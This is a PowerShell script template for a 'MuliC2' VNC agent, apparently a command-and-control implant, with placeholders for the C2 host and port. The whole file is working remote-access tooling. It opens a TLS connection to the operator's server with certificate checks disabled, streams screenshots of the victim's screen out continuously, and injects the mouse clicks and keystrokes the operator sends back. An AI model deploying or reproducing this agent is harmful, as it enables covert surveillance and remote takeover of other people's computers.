# MuliC2 VNC Screen Capture Agent - Robust Version
# C2 Host: {{C2_HOST}}
# C2 Port: {{C2_PORT}}
# Generated: {{GENERATED_DATE}}

param( [string]$C2Host = "{{C2_HOST}}", [int]$C2Port = {{C2_PORT}} )

# Check if running as Administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Administrator)) {
    Write-Host "[!] WARNING: Not running as Administrator. Input simulation may fail!" -ForegroundColor Red
    Write-Host "[!] Consider running PowerShell as Administrator for full functionality." -ForegroundColor Yellow
}

function Start-Cleanup {
    if ($global:cleanupInProgress) { return }
    $global:cleanupInProgress = $true
    $global:isRunning = $false
    
    Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
    
        try {
        if ($global:sslStream) {
            $global:sslStream.Close()
            $global:sslStream.Dispose()
            $global:sslStream = $null
        }
    } catch {
        Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    try {
        if ($global:tcpClient) {
            $global:tcpClient.Close()
            $global:tcpClient.Dispose()
            $global:tcpClient = $null
        }
    } catch {
        Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
}

# Set up cleanup on exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup }
$null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
    Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
    Start-Cleanup
    [System.Environment]::Exit(0)
}

$global:tcpClient = $null
$global:sslStream = $null
$global:isRunning = $true
$global:cleanupInProgress = $false
$global:lastFrameTime = Get-Date
$global:frameCounter = 0
$global:reconnectAttempts = 0
$global:maxReconnectAttempts = 5

# Load required assemblies
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    Write-Host "[+] Required assemblies loaded" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to load assemblies: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Add Win32 API definitions
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    
    public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const int MOUSEEVENTF_LEFTUP = 0x0004;
    public const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const int MOUSEEVENTF_RIGHTUP = 0x0010;
    public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
    public const int MOUSEEVENTF_WHEEL = 0x0800;
    public const uint KEYEVENTF_KEYUP = 0x0002;
}
"@

function Test-Connection {
    try {
        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:sslStream -and $global:sslStream.CanWrite)
    } catch {
        return $false
    }
}

function Connect-ToServer {
    param([int]$timeoutMs = 10000)
    
    try {
        Write-Host "[*] Connecting to MuliC2 server at ${C2Host}:${C2Port}..." -ForegroundColor Cyan
        
        # Clean up existing connection
        if ($global:sslStream) { $global:sslStream.Close(); $global:sslStream.Dispose() }
        if ($global:tcpClient) { $global:tcpClient.Close(); $global:tcpClient.Dispose() }
        
        $global:tcpClient = New-Object System.Net.Sockets.TcpClient
        
        # Set timeouts and buffer sizes
        $global:tcpClient.ReceiveTimeout = 5000
        $global:tcpClient.SendTimeout = 10000
        $global:tcpClient.ReceiveBufferSize = 65536
        $global:tcpClient.SendBufferSize = 65536
        
        # Connect with timeout
        $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
        $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($timeoutMs, $false)
        
        if (-not $waitSuccess) {
            $global:tcpClient.Close()
            throw "Connection timeout after ${timeoutMs}ms"
        }
        
        $global:tcpClient.EndConnect($asyncResult)
        
        if (-not $global:tcpClient.Connected) {
            throw "Connection failed"
        }
        
        # Configure socket options
        $socket = $global:tcpClient.Client
        $socket.NoDelay = $true
        $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
        
        # Get network stream and upgrade to TLS
        $global:sslStream = New-Object System.Net.Security.SslStream($global:tcpClient.GetStream(), $false, {
            param($sender, $certificate, $chain, $sslPolicyErrors)
            return $true  # Accept all certificates (bypass validation)
        })
        
        # Authenticate as client (bypass certificate validation)
        $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
        
        $global:sslStream.ReadTimeout = 1000
        $global:sslStream.WriteTimeout = 5000
        
        Write-Host "[+] TLS connection established" -ForegroundColor Green
        $global:reconnectAttempts = 0
        return $true
        
    } catch {
        Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
        $global:reconnectAttempts++
        return $false
    }
}

function Send-Frame {
    param([byte[]]$frameBytes)
    
    if (-not (Test-Connection)) {
        Write-Host "[!] Connection lost, attempting to reconnect..." -ForegroundColor Yellow
        if (-not (Connect-ToServer)) {
            return $false
        }
    }
    
    try {
        # Send frame length header
        $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
        $global:sslStream.Write($lenBytes, 0, 4)
        
        # Send frame data in chunks to avoid buffer overflow
        $chunkSize = 8192
        $totalSent = 0
        
        while ($totalSent -lt $frameBytes.Length) {
            $remainingBytes = $frameBytes.Length - $totalSent
            $currentChunkSize = [Math]::Min($chunkSize, $remainingBytes)
            
            $global:sslStream.Write($frameBytes, $totalSent, $currentChunkSize)
            $totalSent += $currentChunkSize
            
            # Small delay between chunks to prevent overwhelming the connection
            $global:sslStream.Flush()
            
            # Small delay between chunks to prevent overwhelming the connection
            if ($remainingBytes -gt $chunkSize) {
                Start-Sleep -Milliseconds 1
            }
        }
        return $true
        
    } catch {
        Write-Host "[!] Frame send error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-MouseEvent {
    param(
        [string]$event,
        [float]$x,
        [float]$y,
        [int]$button = 0,
        [int]$deltaY = 0
    )
    
    try {
        $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        
        # Clamp coordinates to screen bounds
        $x = [Math]::Max(0.0, [Math]::Min(1.0, $x))
        $y = [Math]::Max(0.0, [Math]::Min(1.0, $y))
        
        $px = [Math]::Round($x * $realScreenWidth)
        $py = [Math]::Round($y * $realScreenHeight)
        
        # Ensure coordinates are within screen bounds
        $px = [Math]::Max(0, [Math]::Min($px, $realScreenWidth - 1))
        $py = [Math]::Max(0, [Math]::Min($py, $realScreenHeight - 1))
        
        Write-Host "[*] Mouse ${event} at ($px, $py) from relative ($([Math]::Round($x, 3)), $([Math]::Round($y, 3)))" -ForegroundColor Cyan
        
        # Always set cursor position first
        $cursorSet = [Win32API]::SetCursorPos($px, $py)
        if (-not $cursorSet) {
            Write-Host "[!] Failed to set cursor position" -ForegroundColor Yellow
        }
        
        # Verify cursor was set
        Start-Sleep -Milliseconds 10
        $point = New-Object Win32API+POINT
        [Win32API]::GetCursorPos([ref]$point)
        Write-Host "[*] Cursor at: ($($point.X), $($point.Y))" -ForegroundColor Gray
        
        switch ($event) {
            'mousedown' {
                switch ($button) {
                    0 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                        Write-Host "[+] Left mouse button down" -ForegroundColor Green
                    }
                    2 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                        Write-Host "[+] Right mouse button down" -ForegroundColor Green
                    }
                    1 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0)
                        Write-Host "[+] Middle mouse button down" -ForegroundColor Green
                    }
                }
            }
            'mouseup' {
                switch ($button) {
                    0 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                        Write-Host "[+] Left mouse button up" -ForegroundColor Green
                    }
                    2 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                        Write-Host "[+] Right mouse button up" -ForegroundColor Green
                    }
                    1 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0)
                        Write-Host "[+] Middle mouse button up" -ForegroundColor Green
                    }
                }
            }
            'click' {
                switch ($button) {
                    0 { 
                        Write-Host "[*] Executing left click..." -ForegroundColor Cyan
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                        Write-Host "[+] Left click completed" -ForegroundColor Green
                        
                        # Test with SendKeys click as backup
                        try {
                            [System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new($px, $py)
                            Write-Host "[*] Also set cursor via Windows.Forms" -ForegroundColor Gray
                        } catch {
                            Write-Host "[!] Windows.Forms cursor failed: $($_.Exception.Message)" -ForegroundColor Yellow
                        }
                    }
                    2 { 
                        Write-Host "[*] Executing right click..." -ForegroundColor Cyan
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                        Write-Host "[+] Right click completed" -ForegroundColor Green
                    }
                }
            }
            'dblclick' {
                Write-Host "[*] Executing double click..." -ForegroundColor Cyan
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                Start-Sleep -Milliseconds 50
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                Write-Host "[+] Double click completed" -ForegroundColor Green
            }
            'wheel' {
                Write-Host "[*] Mouse wheel scroll, delta: $deltaY" -ForegroundColor Cyan
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, $deltaY, 0)
                Write-Host "[+] Mouse wheel scroll completed" -ForegroundColor Green
            }
            'mousemove' {
                Write-Host "[+] Mouse moved to ($px, $py)" -ForegroundColor Green
            }
        }
        
    } catch {
        Write-Host "[!] Mouse event failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Red
    }
}

function Invoke-KeyboardEvent {
    param(
        [string]$event,
        [string]$key,
        [string]$code,
        [int]$keyCode,
        [bool]$ctrlKey = $false,
        [bool]$shiftKey = $false,
        [bool]$altKey = $false
    )
    
    try {
        Write-Host "[*] Keyboard ${event}: '$key' (Ctrl:$ctrlKey Shift:$shiftKey Alt:$altKey)" -ForegroundColor Cyan
        
        # Handle modifier keys for keydown
        if ($event -eq 'keydown') {
            if ($ctrlKey) { 
                [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero)
                Write-Host "[*] Ctrl pressed" -ForegroundColor Gray
            }
            if ($shiftKey) { 
                [Win32API]::keybd_event(0x10, 0, 0, [UIntPtr]::Zero)
                Write-Host "[*] Shift pressed" -ForegroundColor Gray
            }
            if ($altKey) { 
                [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero)
                Write-Host "[*] Alt pressed" -ForegroundColor Gray
            }
            Start-Sleep -Milliseconds 10
        }
        
        $vkCode = 0
        switch ($key) {
            'Enter' { $vkCode = 0x0D }
            'Escape' { $vkCode = 0x1B }
            'Backspace' { $vkCode = 0x08 }
            'Tab' { $vkCode = 0x09 }
            'Delete' { $vkCode = 0x2E }
            'ArrowUp' { $vkCode = 0x26 }
            'ArrowDown' { $vkCode = 0x28 }
            'ArrowLeft' { $vkCode = 0x25 }
            'ArrowRight' { $vkCode = 0x27 }
            'Space' { $vkCode = 0x20 }
            ' ' { $vkCode = 0x20 }
            default {
                if ($key.Length -eq 1) {
                    $vkResult = [Win32API]::VkKeyScan($key[0])
                    $vkCode = $vkResult -band 0xFF
                } elseif ($keyCode -ne 0) {
                    $vkCode = $keyCode
                }
            }
        }
        
        if ($vkCode -ne 0) {
            if ($event -eq 'keydown') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
                Write-Host "[+] Key down: $key (VK: $vkCode)" -ForegroundColor Green
            } elseif ($event -eq 'keyup') {
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[+] Key up: $key (VK: $vkCode)" -ForegroundColor Green
            } elseif ($event -eq 'keypress') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 50
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[+] Key press: $key (VK: $vkCode)" -ForegroundColor Green
            }
        } else {
            # Fallback to SendKeys for characters
            if ($key.Length -eq 1) {
                try {
                    [System.Windows.Forms.SendKeys]::SendWait($key)
                    Write-Host "[+] Character sent via SendKeys: $key" -ForegroundColor Green
                } catch {
                    Write-Host "[!] SendKeys failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "[!] Could not simulate key: $key" -ForegroundColor Yellow
            }
        }
        
        Start-Sleep -Milliseconds 10
        
        # Release modifier keys
        if ($event -eq 'keyup' -or $event -eq 'keydown' -or $event -eq 'keypress') {
            if ($altKey) { 
                [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[*] Alt released" -ForegroundColor Gray
            }
            if ($shiftKey) { 
                [Win32API]::keybd_event(0x10, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[*] Shift released" -ForegroundColor Gray
            }
            if ($ctrlKey) { 
                [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[*] Ctrl released" -ForegroundColor Gray
            }
        }
        
    } catch {
        Write-Host "[!] Keyboard event failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution
try {
    if (-not (Connect-ToServer)) {
        Write-Host "[!] Initial connection failed" -ForegroundColor Red
        exit 1
    }
    
    $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
    $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
    $targetWidth = 800
    $targetHeight = 600
    
    Write-Host "[*] Starting VNC agent..." -ForegroundColor Cyan
    Write-Host "[*] Screen: ${realScreenWidth}x${realScreenHeight} -> ${targetWidth}x${targetHeight}" -ForegroundColor Gray
    Write-Host "[*] Administrator: $(Test-Administrator)" -ForegroundColor Gray
    Write-Host "[*] Frame rate: 3 FPS (every ~333ms)" -ForegroundColor Gray
    Write-Host "[*] Press CTRL+C to exit gracefully" -ForegroundColor Cyan
    
    while ($global:isRunning) {
        $currentTime = Get-Date
        
        # Handle input events (non-blocking)
        if ((Test-Connection) -and $global:sslStream.DataAvailable) {
            try {
                # Read message length
                $lengthBytes = New-Object byte[] 4
                $totalRead = 0
                while ($totalRead -lt 4 -and $global:sslStream.DataAvailable) {
                    $bytesRead = $global:sslStream.Read($lengthBytes, $totalRead, 4 - $totalRead)
                    if ($bytesRead -eq 0) { break }
                    $totalRead += $bytesRead
                }
                
                if ($totalRead -eq 4) {
                    $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
                    if ($msgLength -gt 0 -and $msgLength -le 8192) {
                        # Read message data
                        $msgBytes = New-Object byte[] $msgLength
                        $totalRead = 0
                        while ($totalRead -lt $msgLength) {
                            $bytesRead = $global:sslStream.Read($msgBytes, $totalRead, $msgLength - $totalRead)
                            if ($bytesRead -eq 0) { break }
                            $totalRead += $bytesRead
                        }
                        
                        if ($totalRead -eq $msgLength) {
                            $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
                            Write-Host "[RX] Input Event: $json" -ForegroundColor Magenta
                            
                            try { 
                                $inputEvent = $json | ConvertFrom-Json 
                                
                                if ($inputEvent.type -eq 'mouse') {
                                    if ($inputEvent.event -eq 'wheel') {
                                        $deltaY = if ($inputEvent.deltaY) { [int]($inputEvent.deltaY * 120) } else { 0 }
                                        Invoke-MouseEvent 'wheel' $inputEvent.x $inputEvent.y $inputEvent.button $deltaY
                                    } else {
                                        Invoke-MouseEvent $inputEvent.event $inputEvent.x $inputEvent.y $inputEvent.button
                                    }
                                } elseif ($inputEvent.type -eq 'keyboard') {
                                    Invoke-KeyboardEvent $inputEvent.event $inputEvent.key $inputEvent.code $inputEvent.keyCode $inputEvent.ctrlKey $inputEvent.shiftKey $inputEvent.altKey
                                } elseif ($inputEvent.type -eq 'test' -and $inputEvent.event -eq 'show_messagebox') {
                                    try {
                                        [System.Windows.Forms.MessageBox]::Show("Input test successful!`n`nIf you see this message, the connection is working.`nClicks should now work properly.", "MuliC2 VNC Agent Test", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
                                        Write-Host "[+] Test MessageBox displayed successfully" -ForegroundColor Green
                                    } catch {
                                        Write-Host "[!] MessageBox failed: $($_.Exception.Message)" -ForegroundColor Red
                                    }
                                }
                            } catch { 
                                Write-Host "[!] JSON parse error: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                    }
                }
            } catch {
                Write-Host "[!] Input read error: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
        
        # Send screen frame every ~333ms (3 FPS to reduce bandwidth)
        if (($currentTime - $global:lastFrameTime).TotalMilliseconds -ge 333) {
            try {
                # Capture screen
                $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
                $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
                $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
                
                # Scale to target resolution
                $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                
                # Convert to JPEG with lower quality for smaller size
                $ms = New-Object System.IO.MemoryStream
                $encoder = [System.Drawing.Imaging.Encoder]::Quality
                $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 60L)  # Lower quality for smaller files
                $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                
                $bmp.Save($ms, $jpegCodec, $encoderParams)
                $frameBytes = $ms.ToArray()
                
                # Clean up resources immediately
                $encoderParams.Dispose()
                $ms.Dispose()
                $graphics.Dispose()
                $bmp.Dispose()
                $graphicsFull.Dispose()
                $bmpFull.Dispose()
                
                # Send frame with robust error handling
                if (Send-Frame $frameBytes) {
                    $global:lastFrameTime = $currentTime
                    $global:frameCounter++
                    
                    if (($global:frameCounter % 30) -eq 0) {  # Log every 30 frames (10 seconds)
                        Write-Host "[*] Frame #$($global:frameCounter) sent ($($frameBytes.Length) bytes)" -ForegroundColor DarkGreen
                    }
                } else {
                    Write-Host "[!] Failed to send frame #$($global:frameCounter + 1)" -ForegroundColor Red
                    
                    # Try to reconnect after a few failed frames
                    if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
                        Write-Host "[!] Max reconnection attempts reached. Exiting..." -ForegroundColor Red
                        break
                    }
                }
                
            } catch {
                Write-Host "[!] Screen capture error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        # Small sleep to prevent excessive CPU usage
        Start-Sleep -Milliseconds 20
        
        # Break if too many reconnection attempts
        if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
            Write-Host "[!] Connection permanently lost. Exiting..." -ForegroundColor Red
            break
        }
    }

} catch {
    Write-Host "[!] Fatal error: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Start-Cleanup
}